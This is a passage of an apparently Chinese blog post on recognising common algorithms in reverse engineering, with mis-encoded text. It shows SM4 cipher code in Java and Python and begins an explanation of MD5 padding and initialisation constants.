class="hljs-comment">//å°†è¾“å…¥ä»¥32æ¯”ç‰¹åˆ†ç»„</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            text[i] = jointBytes(input[<span class="hljs-number">4</span> * i], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br>        &#125;<br>        <span class="hljs-type">int</span> box_input, box_output;<span class="hljs-comment">//ç›’å˜æ¢è¾“å…¥å’Œè¾“å‡º</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (mod == <span class="hljs-number">0</span>) ? i : (<span class="hljs-number">31</span> - i);<span class="hljs-comment">//é€šè¿‡æ”¹å˜key_rçš„é¡ºåºæ”¹å˜æ¨¡å¼</span><br>            box_input = text[<span class="hljs-number">1</span>] ^ text[<span class="hljs-number">2</span>] ^ text[<span class="hljs-number">3</span>] ^ key_r[index];<br>            box_output = sBox(box_input);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> text[<span class="hljs-number">0</span>] ^ box_output ^ shift(box_output, <span class="hljs-number">2</span>) ^ shift(box_output, <span class="hljs-number">10</span>) ^ shift(box_output, <span class="hljs-number">18</span>) ^ shift(box_output, <span class="hljs-number">24</span>);<br>            text[<span class="hljs-number">0</span>] = text[<span class="hljs-number">1</span>];<br>            text[<span class="hljs-number">1</span>] = text[<span class="hljs-number">2</span>];<br>            text[<span class="hljs-number">2</span>] = text[<span class="hljs-number">3</span>];<br>            text[<span class="hljs-number">3</span>] = temp;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-comment">//å°†ç»“æœçš„32æ¯”ç‰¹å­—æ‹†åˆ†</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            System.arraycopy(splitInt(text[<span class="hljs-number">3</span> - i]), <span class="hljs-number">0</span>, output, <span class="hljs-number">4</span> * i, <span class="hljs-number">4</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> output;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] plaintext) &#123;<br>        <span class="hljs-keyword">return</span> sm4Main(plaintext, key_r, <span class="hljs-number">0</span>);<br>    &#125;<br><br>   <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] ciphertext) &#123;<br>        <span class="hljs-keyword">return</span> sm4Main(ciphertext, key_r, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* å°†32æ¯”ç‰¹æ•°æ‹†åˆ†æˆ4ä¸ª8æ¯”ç‰¹æ•° */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] splitInt(<span class="hljs-type">int</span> n) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">24</span>), (<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">16</span>), (<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">8</span>), (<span class="hljs-type">byte</span>) n&#125;;<br>    &#125;<br><br>    <span class="hljs-comment">/* å°†4ä¸ª8æ¯”ç‰¹æ•°åˆå¹¶æˆ32æ¯”ç‰¹æ•° */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jointBytes</span><span class="hljs-params">(<span class="hljs-type">byte</span> byte_0, <span class="hljs-type">byte</span> byte_1, <span class="hljs-type">byte</span> byte_2, <span class="hljs-type">byte</span> byte_3)</span> &#123;<br>        <span class="hljs-keyword">return</span> ((byte_0 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">24</span>) | ((byte_1 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((byte_2 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>) | (byte_3 &amp; <span class="hljs-number">0xFF</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* Sç›’å˜æ¢ */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sBox</span><span class="hljs-params">(<span class="hljs-type">int</span> box_input)</span> &#123;<br>        <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] SBOX = &#123;<br>                <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>,<br>                <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xEF</span>,<br>                <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>,<br>                <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x19</span>,<br>                <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9D</span>,<br>                <span class="hljs-number">0x35</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x40</span>,<br>                <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>,<br>                <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>,<br>                <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6C</span>,<br>                <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x0A</span>,<br>                <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4A</span>,<br>                <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x4D</span>,<br>                <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span><br>        &#125;;<br><br>        <span class="hljs-type">byte</span>[] temp = splitInt(box_input);<span class="hljs-comment">//æ‹†åˆ†32æ¯”ç‰¹æ•°</span><br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];<span class="hljs-comment">//å•ä¸ªç›’å˜æ¢è¾“å‡º</span><br>        <span class="hljs-comment">//ç›’å˜æ¢</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            output[i] = (<span class="hljs-type">byte</span>) SBOX[temp[i] &amp; <span class="hljs-number">0xFF</span>];<br>        &#125;<br>        <span class="hljs-comment">//å°†4ä¸ª8ä½å­—èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªå­—ä½œä¸ºç›’å˜æ¢è¾“å‡º</span><br>        <span class="hljs-keyword">return</span> jointBytes(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>], output[<span class="hljs-number">2</span>], output[<span class="hljs-number">3</span>]);<br>    &#125;<br><br>    <span class="hljs-comment">/* å°†inputå·¦ç§»nä½ */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shift</span><span class="hljs-params">(<span class="hljs-type">int</span> input, <span class="hljs-type">int</span> n)</span> &#123;<br>        <span class="hljs-keyword">return</span> (input &gt;&gt;&gt; (<span class="hljs-number">32</span> - n)) | (input &lt;&lt; n);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŠ è§£å¯†ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SM4</span>:<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.crypt_sm4 = sm4.CryptSM4()  <span class="hljs-comment"># å®ä¾‹åŒ–</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hexStr</span>(<span class="hljs-params">self , hex_str</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å­—ç¬¦ä¸²è½¬hex</span><br><span class="hljs-string">        :param hex_str: å­—ç¬¦ä¸²</span><br><span class="hljs-string">        :return: hex</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        hex_data = hex_str.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        str_bin = binascii.unhexlify(hex_data)<br>        <span class="hljs-keyword">return</span> str_bin.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryptSM4</span>(<span class="hljs-params">self , encrypt_key , value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å›½å¯†sm4åŠ å¯†</span><br><span class="hljs-string">        :param encrypt_key: sm4åŠ å¯†key</span><br><span class="hljs-string">        :param value: å¾…åŠ å¯†çš„å­—ç¬¦ä¸²</span><br><span class="hljs-string">        :return: sm4åŠ å¯†åçš„åå…­è¿›åˆ¶å€¼</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        crypt_sm4 = self.crypt_sm4<br>        crypt_sm4.set_key(encrypt_key.encode() , sm4.SM4_ENCRYPT)  <span class="hljs-comment"># è®¾ç½®å¯†é’¥</span><br>        date_str = <span class="hljs-built_in">str</span>(value)<br>        encrypt_value = crypt_sm4.crypt_ecb(date_str.encode())  <span class="hljs-comment"># å¼€å§‹åŠ å¯†ã€‚bytesç±»å‹</span><br>        <span class="hljs-keyword">return</span> encrypt_value.<span class="hljs-built_in">hex</span>()  <span class="hljs-comment"># è¿”å›åå…­è¿›åˆ¶å€¼</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decryptSM4</span>(<span class="hljs-params">self , decrypt_key , encrypt_value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å›½å¯†sm4è§£å¯†</span><br><span class="hljs-string">        :param decrypt_key:sm4åŠ å¯†key</span><br><span class="hljs-string">        :param encrypt_value: å¾…è§£å¯†çš„åå…­è¿›åˆ¶å€¼</span><br><span class="hljs-string">        :return: åŸå­—ç¬¦ä¸²</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        crypt_sm4 = self.crypt_sm4<br>        crypt_sm4.set_key(decrypt_key.encode() , sm4.SM4_DECRYPT)  <span class="hljs-comment"># è®¾ç½®å¯†é’¥</span><br>        decrypt_value = crypt_sm4.crypt_ecb(<span class="hljs-built_in">bytes</span>.fromhex(encrypt_value))  <span class="hljs-comment"># å¼€å§‹è§£å¯†ã€‚åå…­è¿›åˆ¶ç±»å‹</span><br>        <span class="hljs-keyword">return</span> decrypt_value.decode()<br>        <span class="hljs-comment"># return self.str_to_hexStr(decrypt_value.hex())</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = <span class="hljs-string">&quot;C3AE5873D08418DA&quot;</span><br>    strData = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;&quot;addr&quot;:&quot;&quot;,&quot;regnCode&quot;:&quot;320100&quot;,&quot;medinsName&quot;:&quot;&quot;,&quot;medinsLvCode&quot;:&quot;&quot;,&quot;medinsTypeCode&quot;:&quot;&quot;,&quot;openElec&quot;:&quot;&quot;,&quot;pageNum&quot;:6,&quot;pageSize&quot;:100&#125;&#x27;&#x27;&#x27;</span><br>    SM4 = SM4()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åŸå­—ç¬¦ï¼š&quot;</span> , strData)<br>    encData = SM4.encryptSM4(key , strData)  <span class="hljs-comment"># åŠ å¯†åçš„æ•°æ®ï¼Œè¿”å›bytesç±»å‹</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sm4åŠ å¯†ç»“æœï¼š&quot;</span> , encData)<br><br>    decData = SM4.decryptSM4(key , encData)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sm4è§£å¯†ç»“æœï¼š&quot;</span> , decData)  <span class="hljs-comment"># è§£å¯†åçš„æ•°æ®</span><br></code></pre></td></tr></table></figure><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>[<a href="https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%20%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E6%A0%B9%E6%8D%AE%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E4%BF%AE%E6%94%B9%E3%80%81%E6%B3%A8%E9%87%8A%E8%80%8C%E6%9D%A5%EF%BC%8C%E6%AF%95%E7%AB%9FMD5%E7%AE%97%E6%B3%95%E4%B8%8D%E6%98%AF%E6%88%91%E5%8E%9F%E5%88%9B%E7%9A%84%E3%80%82%20%2F%2A,%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%EF%BC%9A%20%E5%85%88%E8%B0%83%E7%94%A8MD5Init%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%80%E4%B8%AAMD5_CTX%E7%B1%BB%E5%9E%8B%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8MD5Update%E8%AE%A1%E7%AE%97MD5%E7%A0%81%EF%BC%8C%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8MD5Final%E8%8E%B7%E5%8F%96%20%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%E8%A7%81%E6%9C%80%E4%B8%8B%E9%9D%A2%E7%9A%84main%E5%87%BD%E6%95%B0%E3%80%82]">https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%20%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E6%A0%B9%E6%8D%AE%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E4%BF%AE%E6%94%B9%E3%80%81%E6%B3%A8%E9%87%8A%E8%80%8C%E6%9D%A5%EF%BC%8C%E6%AF%95%E7%AB%9FMD5%E7%AE%97%E6%B3%95%E4%B8%8D%E6%98%AF%E6%88%91%E5%8E%9F%E5%88%9B%E7%9A%84%E3%80%82%20%2F%2A,%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%EF%BC%9A%20%E5%85%88%E8%B0%83%E7%94%A8MD5Init%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%80%E4%B8%AAMD5_CTX%E7%B1%BB%E5%9E%8B%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8MD5Update%E8%AE%A1%E7%AE%97MD5%E7%A0%81%EF%BC%8C%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8MD5Final%E8%8E%B7%E5%8F%96%20%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%E8%A7%81%E6%9C%80%E4%B8%8B%E9%9D%A2%E7%9A%84main%E5%87%BD%E6%95%B0%E3%80%82]</a>(<a href="https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0">https://zhuanlan.zhihu.com/p/115270932#:~:text=Cè¯­è¨€å®ç°</a> ä»¥ä¸‹ä»£ç æ ¹æ®å‚è€ƒæ–‡çŒ®ä¿®æ”¹ã€æ³¨é‡Šè€Œæ¥ï¼Œæ¯•ç«ŸMD5ç®—æ³•ä¸æ˜¯æˆ‘åŸåˆ›çš„ã€‚ %2F*,å‡½æ•°ä½¿ç”¨è¯´æ˜ï¼š å…ˆè°ƒç”¨MD5Initåˆå§‹åŒ–ä¸€ä¸ªMD5_CTXç±»å‹ç»“æ„ä½“ï¼Œå†ä½¿ç”¨MD5Updateè®¡ç®—MD5ç ï¼Œæœ€åè°ƒç”¨MD5Finalè·å– ä½¿ç”¨ç¤ºä¾‹è§æœ€ä¸‹é¢çš„mainå‡½æ•°ã€‚)</p><p>MD5åŠ å¯†çš„å‡½æ•°å¤§è‡´å¦‚ä¸‹ï¼š</p><p>MD5_CTX md5c;ï¼ˆç»“æ„ä½“ï¼‰</p><p>MD5Init(&amp;md5c);</p><p>MD5UpdateString(&amp;md5c,plain)</p><p>MD5Final(digest,&amp;md5c);</p><h2 id="æ•°æ®å¡«å……"><a href="#æ•°æ®å¡«å……" class="headerlink" title="æ•°æ®å¡«å……"></a>æ•°æ®å¡«å……</h2><p>MD5ç®—æ³•çš„ç¬¬äºŒæ­¥â€œåˆ†ç»„å¾ªç¯å˜æ¢â€æ˜¯ä»¥<strong>512</strong>ä½ä¸ºä¸€ä¸ªåˆ†ç»„è¿›è¡Œå¤„ç†çš„ã€‚å› æ­¤ï¼Œéœ€è¦æŠŠæ•°æ®å¡«å……æˆé•¿åº¦ä¸º512ä½çš„å€æ•°ã€‚å…·ä½“å¡«å……æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ã€å…ˆå¡«å……ä¸€ä¸ªâ€œ1â€ï¼Œåé¢åŠ ä¸Škä¸ªâ€œ0â€ã€‚å…¶ä¸­kæ˜¯æ»¡è¶³(n+1+k) mod 512 &#x3D; 448çš„æœ€å°æ­£æ•´æ•°ã€‚</p><p>2ã€è¿½åŠ 64ä½çš„æ•°æ®é•¿åº¦ï¼ˆbitä¸ºå•ä½ï¼Œå°ç«¯åºå­˜æ”¾ï¼‰</p><p>å¡«å……å®Œçš„æ•°æ®å¤§æ¦‚é•¿è¿™æ ·ï¼š</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970015957-e790cc21-69cd-4c27-82ec-04f5e2389777.png" class="" title="img"><h2 id="åˆ†ç»„å¾ªç¯å˜æ¢"><a href="#åˆ†ç»„å¾ªç¯å˜æ¢" class="headerlink" title="åˆ†ç»„å¾ªç¯å˜æ¢"></a>åˆ†ç»„å¾ªç¯å˜æ¢</h2><p>å…¶ä¸­ï¼ŒMD5Initä¼šåˆå§‹åŒ–å››ä¸ªç§°ä½œMD5é“¾æ¥å˜é‡çš„æ•´å½¢å‚æ•°ã€‚å› æ­¤å¦‚æœçœ‹åˆ°è¿™4ä¸ªå¸¸æ•°<code>0x67452301ã€0xefcdab89ã€0x98badcfeã€0x10325476</code>ï¼Œå°±åº”è¯¥æ˜¯MD5ç®—æ³•äº†ã€‚MD5Initå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">void MD5Init(MD5_CTX *context)  <br>&#123;  <br>     context-&gt;count[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  <br>     context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  <br>     //Load magic initialization constants<br>     context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0x67452301</span>;  <br>     context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0xEFCDAB89</span>;  <br>     context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x98BADCFE</span>;  <br>     context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x10325476</span>;  